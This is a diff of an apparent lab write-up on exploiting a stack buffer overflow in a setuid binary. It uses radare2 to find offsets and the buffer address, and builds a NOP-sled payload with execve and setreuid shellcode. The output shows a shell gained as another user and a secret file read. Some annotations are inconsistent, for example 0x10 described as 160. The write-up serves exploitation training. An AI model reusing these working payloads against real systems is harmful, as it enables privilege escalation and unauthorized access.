@@ -1077,17 +1077,11 @@ You’ve probably noticed that shellcode, memory addresses and NOP sleds are usu
 - There will also be an 8-byte instruction pointer
 - The minimum overflow length is 156 bytes to reach the return address at byte 157 to begin overwriting the return address
 
-The Expected memory space looks like
-
-```md
-[140-byte buffer][8-byte RBP][8-byte RIP][8-byte return address]
-```
-
 #### Find the Segmentation Error
 
 We will start at byte 141. This will allow us to see if a compiler has altered the stack layout
 
-`:> ./buffer-overflow $(python -c "print('\x41'*141)")` causes the segementation error.  
+`:> ./buffer-overflow $(python -c "print('\x41'*144)")` causes the segementation error.  
 
 ![Early Overflow](/assets/buffer-overflows-task8-01.png)
 
@@ -1109,9 +1103,9 @@ Use `:> s main` to find main(), then `pdf` to 'print disassembly of function' ma
            ; arg int argc @ rdi
            ; arg char **argv @ rsi
            ; DATA XREF from entry0 @ 0x40046d
-           0x00400564      55             push rbp
-           0x00400565      4889e5         mov rbp, rsp
-           0x00400568      4883ec10       sub rsp, 0x10
+           0x00400564      55             push rbp ; <- takes the current value in the rbp register and pushes it onto the stack
+           0x00400565      4889e5         mov rbp, rsp ; <- Copy the memory address of rsp into and place it into rbp. rsp and rbp temporarily point to the same memory location.
+           0x00400568      4883ec10       sub rsp, 0x10 ; <- subtract 160 from rsp. Note: there are now 160 bytes between rsp and rbp
            0x0040056c      897dfc         mov dword [var_4h], edi     ; argc <- count of command line arguments; value is moved from edit to var_4h
            0x0040056f      488975f0       mov qword [var_10h], rsi    ; argv <- moves the memory address of argv array from rsi to var_10h
            0x00400573      bf30064000     mov edi, str.Here_s_a_program_that_echo_s_out_your_input ; 0x400630 ; "Here's a program that echo's out your input"
@@ -1138,9 +1132,31 @@ Use `:> s main` to find main(), then `pdf` to 'print disassembly of function' ma
            ; var int64_t var_90h @ rbp-0x90 <- initiate a 64-bit variable at memory address rbp-0x90 (rbp minus 144 bytes).
            ; arg int64_t arg1 @ rdi <- document a function paramter, pointing arg1 to the memory location of rdi
            ; CALL XREF from main @ 0x40058b
-           0x00400527      55             push rbp
-           0x00400528      4889e5         mov rbp, rsp ; <- creates a static reference point that saves the beginning of the stack
-           0x0040052b      4881eca00000.  sub rsp, 0xa0 ; <- allocate 160 bytes stack space for this function; subtracts 160 bytes from rsp to move it lower int the stacking, making room for local variables
+           0x00400527      55             push rbp ; <- takes the current value in the rbp register and pushes it onto the stack
+           0x00400528      4889e5         mov rbp, rsp ; <- creates a static reference point that saves the beginning of this funcion's stack frame, copy the memory address value from rsp into rbp. rsp and rbp temporarily point to the same memory location.
+           0x0040052b      4881eca00000.  sub rsp, 0xa0 ; <- subtract 160 from rsp. Note: there are now 160 bytes between rsp and rbp while the saved return address is now rbp + 8
+```
+
+After these instructions:  
+
+- rbp + 8: return address
+- rbp + 0: saved rbp
+- var_90h is at rbp - 0x90
+- var_98h is at rbp - 0x98
+
+If we change the reference point to rsp, from rbp the stack looks more like:
+
+- rsp = rsp +0
+- var_98h = rsp + 8
+- var_90h = rsp + 16 <- buffer, which turns out to be 144 bytes from rbp.
+- rbp = rsp + 160
+- return address = rsp + 168 or 
+- 
+- Return address = rsp + 168 = buffer + 152 = rbp +8
+
+```md
+
+
            0x00400532      4889bd68ffff.  mov qword [var_98h], rdi    ; arg1 <- rdi is currently storing the memory address of argv[1]. This will move that memory address from rdi as the value contained in var_98h, at memory address rbp-0x98.
            0x00400539      488b9568ffff.  mov rdx, qword [var_98h] ; <-the presence of the brackets moves the value stored at rbp-0x98 to memory location rdx. RDX now contains the pointer to argv[1]
            0x00400540      488d8570ffff.  lea rax, [var_90h] ; <- go to the contents of variable var_90h. Determine the memory address where the value starts, load that address into rax.
@@ -1148,7 +1164,7 @@ Use `:> s main` to find main(), then `pdf` to 'print disassembly of function' ma
            0x0040054a      4889c7         mov rdi, rax ; <- rdi will now contain the beginning address of the 140-byte buffer
            0x0040054d      e8defeffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src) <- assumes any required parameters start with rdi; it requires two registers meaning rsi (source because it was the second paramter passed) and rdi (destination, as the first parameter passed) are the registers involved; reads the contents of rsi (the memory address location of argv[1], begins the copy operation, reads the value of rdi (the beginning of the 140-byte buffer) and starts writing to var_90h, the buffer)
            0x00400552      488d8570ffff.  lea rax, [var_90h] ; <- identifies the beginning memory address of var_90h and places that memory address into rax
-           0x00400559      4889c7         mov rdi, rax ; <- moves the memory address in rax to rdi, for use in the next function call>
+           0x00400559      4889c7         mov rdi, rax ; <- moves the memory address in rax to rdi, for use in the next function call
            0x0040055c      e8dffeffff     call sym.imp.puts           ; int puts(const char *s) <- prints whatever the user input until reaching the null terminator '\0', even if it's longer than the 140 byte buffer
            0x00400561      90             nop ; <- the next function in main() begins at 0x00400564. One nop is needed to align memory according to the 4-8-16-32-64 byte boundary convention
            0x00400562      c9             leave ; <- two instructions in one `mov rsp, rbp` and `pop rbp`, in effect making the entire 160-byte stack available for other functions>
@@ -1156,7 +1172,7 @@ Use `:> s main` to find main(), then `pdf` to 'print disassembly of function' ma
 
 ```
 
-The buffer overflow will replace `ret` with whatver pattern the attacker used. The segmentation error happens when the CPU realizes this is not a legitimate memory address
+The buffer overflow will replace `ret` with whatever pattern the attacker used. The segmentation error happens when the CPU realizes this is not a legitimate memory address
 
 #### Generate A Test Pattern
 
@@ -1178,33 +1194,29 @@ This gives us a string of four-byte characters that are still random within the 
 
 It is unnecessary to actually generate the test pattern. Instead, we simply run radare2 with the ragg2 commad as argv[1]
 
-`:> r2 -d ./buffer-overflow $(ragg2 -P 200)`  
-
-We also have to continue the debug once: `dc`
-
-And dump the registers `dr`
-
 ```md
-[user1@ip-10-201-104-26 overflow-3]$ r2 -d ./buffer-overflow $(ragg2 -P 200 -r)
-Process with PID 12766 started...
-= attach 12766 12766
+[user1@ip-10-65-185-212 overflow-3]$ r2 -d ./buffer-overflow $(ragg2 -P 200 -r)
+Process with PID 12835 started...
+= attach 12835 12835
 bin.baddr 0x00400000
 Using 0x400000
 asm.bits 64
- -- No fix, no sleep
-[0x7ffff7dd9ef0]> dc
+ -- Use /m to carve for known magic headers. speedup with search.
+[0x7ffff7dd9ef0]> dc ;<-- Continue
 Here's a program that echo's out your input
 AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA
 child stopped with signal 11
 [+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
-[0x00400563]> dr
+[0x00400563]> 
+
+[0x00400563]> dr ;<-- dump the registers
 rax = 0x000000c9
 rbx = 0x00000000
 rcx = 0x7ffff7b0d584
 rdx = 0x7ffff7dd58c0
-r8 = 0x4641414541414441 ;<- Compromised register
-r9 = 0x4141484141474141 ;<- Compromised register
-r10 = 0x414b41414a414149 ;<- Compromised register
+r8 = 0x4641414541414441 ;<-- overwritten
+r9 = 0x4141484141474141 ;<-- overwritten
+r10 = 0x414b41414a414149 ;<-- overwritten
 r11 = 0x00000246
 r12 = 0x00400450
 r13 = 0x7fffffffe3b0
@@ -1213,64 +1225,33 @@ r15 = 0x00000000
 rsi = 0x00602260
 rdi = 0x00000000
 rsp = 0x7fffffffe2b8
-rbp = 0x4179414178414177 ;<- Compromised register
+rbp = 0x4179414178414177 ;<-- overwritten
 rip = 0x00400563
 rflags = 0x00010206
 orax = 0xffffffffffffffff
 [0x00400563]> 
 ```
 
-For use in the eventual exploit, this must be in little-endian: \x10\xe2\xff\xff\xff\x7f
-
-continue to the next breakpoint: `dc`
-
-Inspect the registers with `dr`:  
-
-![dr registers](assets/buffer-overflow-23-task8-13.png)
+We can find the exact offset of the overflow by querying the pattern at `rbp` and querying how far into the ragg2 pattern this sub-string appears:
 
 ```md
-[0x00400563]> dr
-rax = 0x000000c9
-rbx = 0x00000000
-rcx = 0x7ffff7b0d584
-rdx = 0x7ffff7dd58c0
-r8 = 0x4641414541414441
-r9 = 0x4141484141474141
-r10 = 0x414b41414a414149
-r11 = 0x00000246
-r12 = 0x00400450
-r13 = 0x7fffffffe380
-r14 = 0x00000000
-r15 = 0x00000000
-rsi = 0x00602260
-rdi = 0x00000000
-rsp = 0x7fffffffe288
-rbp = 0x4179414178414177 <- base pointer is corrupted with our pattern. After changing this from little to big-endian the pattern is "wAAxAAyA"
-rip = 0x00400563 <- Instruction Pointer is holding at the breakpoint
-rflags = 0x00000206
-orax = 0xffffffffffffffff
-
+root@ip-10-65-96-45:~# echo "4179414178414177" | xxd -r -p | rev
+wAAxAAyA
+root@ip-10-65-96-45:~# ragg2 -q 0x7741417841417941
+Little endian: -1
+Big endian: 144
+root@ip-10-65-96-45:~# 
 ```
 
-We can find the exact offset by querying the pattern at `rbp`:  
+This indicates that the saved rbp is being overwritten at 144 bytes into the pattern.  
+The return address is located at rbp + 8 meaning overwriting the return address begins at 152 bytes into the pattern.  
+There is some sort of discrepancy because the 80 bytes indicated is nowhere near the 152 bytes estimated by simple analysis. This could be simple human error.  
 
-```md
-[0x00400563]> ragg2 -q 0x4179414178414177
-Little endian: 144
-Big endian: -1
-[0x00400563]>
-```
-
-`rbp` is 8 bytes, which takes us to 151.  
-the Saved Return Address, then, begins at 152 bytes.  
-
- 
-
-#### Exploit 
 
 Since the compromised return address must be within the NOP sled, we need to identify the runtime address of the buffer.
 
 From the earlier printout of sym.copy_arg `var int64_t var_90h @ rbp-0x90 ; <- We want this memory address`  
+
 We can restart the program to have a clean set of memory registers.
 
 `:> r2 -d ./buffer-overflow AAAA`
@@ -1279,35 +1260,47 @@ Set a breakpoint at the beginning of the sym.copy_arg function: `0x00400527     
 Set another breakpoint where at the "load effective address" instruction : `0x00400540      488d8570ffff.  lea rax, [var_90h]` with `db 0x00400540`  
 
 ```md
-r2 -d ./buffer-overflow AAAA
-Process with PID 13072 started...
-= attach 13072 13072
+[user1@ip-10-65-185-212 overflow-3]$ r2 -d ./buffer-overflow AAAA
+Process with PID 12877 started...
+= attach 12877 12877
 bin.baddr 0x00400000
 Using 0x400000
 asm.bits 64
- -- Don't trust what can't be compiled
+ -- Heisenbug: A bug that disappears or alters its behavior when one attempts to probe or isolate it.
+[0x7ffff7dd9ef0]> aaaa
+[Cannot analyze at 0x00600ff0g with sym. and entry0 (aa)
+Invalid address from 0x004005e9
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
+Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Check for objc references
+[x] Check for vtables
+[TOFIX: aaft can't run in debugger mode.ions (aaft)
+[x] Type matching analysis for all functions (aaft)
+[x] Propagate noreturn information
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
+[x] Finding function preludes
+[x] Enable constraint types analysis for variables
 [0x7ffff7dd9ef0]> db 0x00400527
 [0x7ffff7dd9ef0]> db 0x00400540
 [0x7ffff7dd9ef0]> 
 
+
 ```
 
-The output from this is: 
-```asm
-r2 -d ./buffer-overflow AAAA
-Process with PID 13072 started...
-= attach 13072 13072
-bin.baddr 0x00400000
-Using 0x400000
-asm.bits 64
- -- Don't trust what can't be compiled
+Continue to the first breakpoint:
+
+```md
 [0x7ffff7dd9ef0]> db 0x00400527
 [0x7ffff7dd9ef0]> db 0x00400540
 [0x7ffff7dd9ef0]> dc
 Here's a program that echo's out your input
 hit breakpoint at: 400527
 [0x00400527]> dr
-rax = 0x7fffffffe6cb
+rax = 0x7fffffffe6cf
 rbx = 0x00000000
 rcx = 0x7ffff7b0d584
 rdx = 0x7ffff7dd58c0
@@ -1320,19 +1313,26 @@ r13 = 0x7fffffffe470
 r14 = 0x00000000
 r15 = 0x00000000
 rsi = 0x00602260
-rdi = 0x7fffffffe6cb
+rdi = 0x7fffffffe6cf
 rsp = 0x7fffffffe378
 rbp = 0x7fffffffe390
 rip = 0x00400527
 rflags = 0x00000212
 orax = 0xffffffffffffffff
-[0x00400527]> dc
+[0x00400527]> 
+```
+
+No function prologue has been executed, so continue:
+
+```md
+[0x00400527]> dc ;<-- executes the function prologue which sets the stack frame
 hit breakpoint at: 400540
+[0x00400540]> 
 [0x00400540]> dr
-rax = 0x7fffffffe6cb
+rax = 0x7fffffffe6cf
 rbx = 0x00000000
 rcx = 0x7ffff7b0d584
-rdx = 0x7fffffffe6cb
+rdx = 0x7fffffffe6cf
 r8 = 0x00000003
 r9 = 0x00000077
 r10 = 0x00000000
@@ -1342,22 +1342,40 @@ r13 = 0x7fffffffe470
 r14 = 0x00000000
 r15 = 0x00000000
 rsi = 0x00602260
-rdi = 0x7fffffffe6cb
-rsp = 0x7fffffffe2d0
-rbp = 0x7fffffffe370
+rdi = 0x7fffffffe6cf ;<-- As the first register for variables, contains the pointer to the AAAA string, argv[1]
+rsp = 0x7fffffffe2d0 ; <-- changed from 0x7fffffffe378 (rbp-0xa0)
+rbp = 0x7fffffffe370 <-- changed from 0x7fffffffe390 to 0x7fffffffe370
 rip = 0x00400540
 rflags = 0x00000202
 orax = 0xffffffffffffffff
+[0x00400540]> 
 ```
-As expected, `rax` has not updated because we are paused at the instruction, before it executes.  
+
+argv[1] is located at 0x7fffffffe6cf  
+
+```md
+[0x00400540]> px 10 @ 0x7fffffffe6cf
+- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+0x7fffffffe6cf  4141 4141 0058 4447 5f53                 AAAA.XDG_S
+
+OR
+
+[0x00400540]> px 10 @ rdi
+- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+0x7fffffffe6cf  4141 4141 0058 4447 5f53                 AAAA.XDG_S
+[0x00400540]> 
+```
+
+As expected, `rax` has not updated because we are paused at the instruction `lea rax, [var_90h]`, before it executes.  
 We will step forward one instruction with `:> ds`  
+
 ```md
 [0x00400540]> ds
 [0x00400540]> dr
 rax = 0x7fffffffe2e0
 rbx = 0x00000000
 rcx = 0x7ffff7b0d584
-rdx = 0x7fffffffe6cb
+rdx = 0x7fffffffe6cf
 r8 = 0x00000003
 r9 = 0x00000077
 r10 = 0x00000000
@@ -1367,84 +1385,107 @@ r13 = 0x7fffffffe470
 r14 = 0x00000000
 r15 = 0x00000000
 rsi = 0x00602260
-rdi = 0x7fffffffe6cb
+rdi = 0x7fffffffe6cf
 rsp = 0x7fffffffe2d0
 rbp = 0x7fffffffe370
 rip = 0x00400547
 rflags = 0x00000202
 orax = 0xffffffffffffffff
 [0x00400540]> 
+
 ```
-`rax` is now set to `0x7fffffffe2e0`  
-`rbp` is now set to `0x7fffffffe370`
 
-What we are looking for `rbp-0x90`.
+`rax` is now set to `0x7fffffffe2e0`, which is the memory address of var_90h (the vulnerable buffer)  
 
-We can verify with a ![Hex Calculator](https://www.rapidtables.com/calc/math/hex-calculator.html)
+We verifty by looking for `rbp-0x90`.  
 
-![Buffer Runtime Address](assets/buffer-overflow-18-task8-7.png)  
+![Hex math](assets/buffer-overflows-task8-2.png)
 
-After translation from big-endian to little-endian our return address can start at `\xe0\xe2\xff\xff\xff\x7f\`
+#### Exploit  
+
+Known:  
+
+- rbp + 8: return address, or `0x7fffffffe378`
+- rbp + 0: saved rbp, or `0x7fffffffe370`
+- var_90h is at rbp - 0x90, or `0x7fffffffe2e0`
+- var_98h is at rbp - 0x98
+
+```md
 
 
 The attack command, then can become:  
 
-`:> ./buffer-overflow $(python -c "print('\x90'*127 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\xe0\xe2\xff\xff\xff\x7f\x00\x00')")`
+`:> ./buffer-overflow $(python -c "print('\x90'*102 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\x90' * 20 + '\xe9\xe2\xff\xff\xff\x7f\x00\x00')")`  
 
-![OOPS](assets/buffer-overflow-19-task8-8.png)
+However, this shellcode is bad. The `\x11` looks to be a problem. 
 
-This command doesn't work. It doesn't account for alignment bytes, base pointer, or stack pointer addresses which, by convention, would be included. 
-We can change the command and automate it in a single step in an attempt to reduce our effort.  
+This shellcode and payload is used:
 
-The original math indicated `ret` would be overwritten at 149 bytes. This turned out to be too high as the segmentation error was indicated at 144 bytes.  
-
-returning to, and adjusting, the model above:  
 ```md
-[140-byte buffer][alignment padding (4 bytes?)][8-byte rbp][8-byte rip][6-byte return address]
+[user1@ip-10-65-185-212 overflow-3]$ ./buffer-overflow $(python -c "print('\x90'*92 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90' * 20 + '\xe9\xe2\xff\xff\xff\x7f\x00\x00')")
+Here's a program that echo's out your input
+\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdj;XH1\ufffdI\ufffd//bin/shI\ufffdAPH\ufffd\ufffdRWH\ufffd\ufffdj<XH1\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd
+sh-4.2$ ls
+buffer-overflow  buffer-overflow.c  exploit.txt  secret.txt
+sh-4.2$ cat secret.txt
+cat: secret.txt: Permission denied
+sh-4.2$ 
+```
+The file owner is user2:  
+
+```md
+user1@ip-10-65-185-212 overflow-3]$ ls -alh
+total 24K
+drwxrwxr-x 2 user1 user1   91 Nov 25 00:09 .
+drwx------ 7 user1 user1  169 Nov 27  2019 ..
+-rwsrwxr-x 1 user2 user2 8.1K Sep  2  2019 buffer-overflow
+-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c
+-rw-rw-r-- 1 user1 user1  179 Nov 25 00:10 exploit.txt
+-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt
+[user1@ip-10-65-185-212 overflow-3]$ 
+```
+We find the userid of user2: 
+
+```md
+[user1@ip-10-65-185-212 overflow-3]$ cat /etc/passwd
+...
+user1:x:1001:1001::/home/user1:/bin/bash
+user2:x:1002:1002::/home/user2:/bin/bash
+user3:x:1003:1003::/home/user3:/bin/bash
+...
+
 ```
 
-Experiment with a bash script:  
+We need a shellcode that sets the user id to 1002: 
 
-```bash
-#!/bin/bash
+```md
+root@ip-10-65-96-45:~# pwn shellcraft -f d amd64.linux.setreuid 1002
+[*] Checking for new versions of pwntools
+    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.8/update to 'never' (old way).
+    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
+        [update]
+        interval=never
+[*] A newer version of pwntools is available on pypi (4.13.1 --> 4.15.0).
+    Update with: $ pip install -U pwntools
+\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
+```
 
-# This script prepares and executes a buffer overflow command using specific values
-# defined by the user for educational and ethical testing purposes only.
+The new exploit becomes:  
 
-# Prompt user for the number of NOPs
-echo "Please enter the number of NOPs:"
-read USER_NUM_NOPS
+`:> ./buffer-overflow $(python -c "print('\x90'*90 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90' * 8 + '\xe9\xe2\xff\xff\xff\x7f\x00\x00')")`  
 
-# Validate input is a number (basic check)
-if ! [[ "$USER_NUM_NOPS" =~ ^[0-9]+$ ]]; then
-    echo "Error: Invalid number provided. Exiting."
-    exit 1
-fi
+Leading to: 
 
-NUM_NOPS=$USER_NUM_NOPS
-echo "Using $NUM_NOPS NOPs"
+```md
+[user1@ip-10-65-185-212 overflow-3]$ ./buffer-overflow $(python -c "print('\x90'*90 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90' * 8 + '\xe9\xe2\xff\xff\xff\x7f\x00\x00')")
+Here's a program that echo's out your input
+\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd1\ufffdf\ufffd\ufffdjqXH\ufffd\ufffdj;XH1\ufffdI\ufffd//bin/shI\ufffdAPH\ufffd\ufffdRWH\ufffd\ufffdj<XH1\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd
+sh-4.2$ ls
+buffer-overflow  buffer-overflow.c  exploit.txt  secret.txt
+sh-4.2$ whoami
+user2
+sh-4.2$ cat secret.txt
+omgyoudidthissocool!!
+sh-4.2$ 
 
-S_CODE="\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05"
-NUM_JUNK=12
-# adjust the return address to ensure the return lands within the NOPS
-RET_OVER="\x10\xe2\xff\xff\xff\x7f\x00\x00"
-
-# The command constructs the full payload using a Python 2 one-liner to generate the string.
-# Note the use of "print" instead of "print()".
-# The resulting string is passed as an argument to the './buffer-overflow' executable.
-# Ensure you have compiled the C code first using "gcc buffer-overflow.c -o buffer-overflow" and disabled security features like ASLR if needed.
-payload=$(printf "\x90%.0s" $(seq 1 $NUM_NOPS))
-payload+=$S_CODE
-payload+=$(printf "\x90%.0s" $(seq 1 $NUM_JUNK))
-payload+=$RET_OVER
-
-./buffer-overflow "$payload"
-```  
-
-NOTE:  
-\x90 : this is the actual NOP instruction byte (the no-operation sled byte).
-%.0s : this is a printf format specifier that means:
-
-- print a string (s),
-- but with a precision of 0 (the .0 part),
-- so it prints zero characters from the argument.  
+```
